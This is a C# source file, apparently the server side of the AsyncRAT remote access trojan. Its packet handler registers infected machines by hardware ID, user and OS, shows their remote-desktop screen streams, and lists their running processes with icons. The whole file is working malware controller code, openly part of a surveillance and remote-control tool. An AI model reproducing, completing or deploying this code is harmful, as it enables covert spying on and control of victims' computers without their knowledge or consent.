using AsyncRAT_Sharp.Sockets;
using System.Windows.Forms;
using AsyncRAT_Sharp.MessagePack;
using System;
using System.Diagnostics;
using System.Drawing;
using AsyncRAT_Sharp.Forms;
using System.IO;


namespace AsyncRAT_Sharp.Handle_Packet
{
    class HandlePacket
    {
        public static void Read(Clients Client, byte[] Data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(Data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "ClientInfo":
                        if (Program.form1.listView1.InvokeRequired)
                        {
                            Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                            {
                                Client.LV = new ListViewItem();
                                Client.LV.Tag = Client;
                                Client.LV.Text = string.Format("{0}:{1}", Client.Client.RemoteEndPoint.ToString().Split(':')[0], Client.Client.LocalEndPoint.ToString().Split(':')[1]);
                                Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                                Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                                Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                                Client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
                                Program.form1.listView1.Items.Insert(0, Client.LV);
                                Settings.Online.Add(Client);
                            }));
                        }
                        break;

                    case "Ping":
                        {
                            Debug.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
                        }
                        break;

                    case "Received":
                        {
                            if (Program.form1.listView1.InvokeRequired)
                            {
                                Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
                                {
                                    Client.LV.ForeColor = Color.Empty;
                                }));
                            }
                        }
                        break;

                    case "remoteDesktop":
                        {
                            if (Program.form1.InvokeRequired)
                            {
                                Program.form1.BeginInvoke((MethodInvoker)(() =>
                                {
                                    RemoteDesktop RD = (RemoteDesktop)Application.OpenForms["RemoteDesktop:" + Client.ID];
                                    try
                                    {
                                        if (RD != null && RD.Active == true)
                                        {
                                            byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                                            Bitmap decoded = RD.decoder.DecodeData(new MemoryStream(RdpStream));

                                            if (RD.RenderSW.ElapsedMilliseconds >= (1000 / 20))
                                            {
                                                RD.pictureBox1.Image = (Bitmap)decoded;
                                                RD.RenderSW = Stopwatch.StartNew();
                                            }
                                            RD.FPS++;
                                            if (RD.sw.ElapsedMilliseconds >= 1000)
                                            {
                                                RD.Text = "RemoteDesktop:" + Client.ID + "    FPS:" + RD.FPS + "    Screen:" + decoded.Width + " x " + decoded.Height + "    Size:" + Helper.BytesToString(RdpStream.Length);
                                                RD.FPS = 0;
                                                RD.sw = Stopwatch.StartNew();
                                            }
                                        }
                                        else
                                        {
                                            MsgPack msgpack = new MsgPack();
                                            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                                            msgpack.ForcePathObject("Option").AsString = "false";
                                            Client.BeginSend(msgpack.Encode2Bytes());
                                        }
                                    }
                                    catch (Exception ex) { Debug.WriteLine(ex.Message); }
                                }));
                            }
                        }
                        break;

                    case "processManager":
                        {
                            if (Program.form1.InvokeRequired)
                            {
                                Program.form1.BeginInvoke((MethodInvoker)(() =>
                                {
                                    ProcessManager PM = (ProcessManager)Application.OpenForms["processManager:" + Client.ID];
                                    if (PM != null)
                                    {
                                        PM.listView1.Items.Clear();
                                        string AllProcess = unpack_msgpack.ForcePathObject("Message").AsString;
                                        string data = AllProcess.ToString();
                                        string[] _NextProc = data.Split(new[] { "-=>" }, StringSplitOptions.None);
                                        for (int i = 0; i < _NextProc.Length; i++)
                                        {
                                            if (_NextProc[i].Length > 0)
                                            {
                                                ListViewItem lv = new ListViewItem();
                                                lv.Text = Path.GetFileName(_NextProc[i]);
                                                lv.SubItems.Add(_NextProc[i + 1]);
                                                lv.ToolTipText = _NextProc[i];
                                                Image im = Image.FromStream(new MemoryStream(Convert.FromBase64String(_NextProc[i + 2])));
                                                PM.imageList1.Images.Add(_NextProc[i + 1], im);
                                                lv.ImageKey = _NextProc[i + 1];
                                                PM.listView1.Items.Add(lv);
                                            }
                                            i += 2;
                                        }
                                    }
                                }));
                            }
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }
    }
}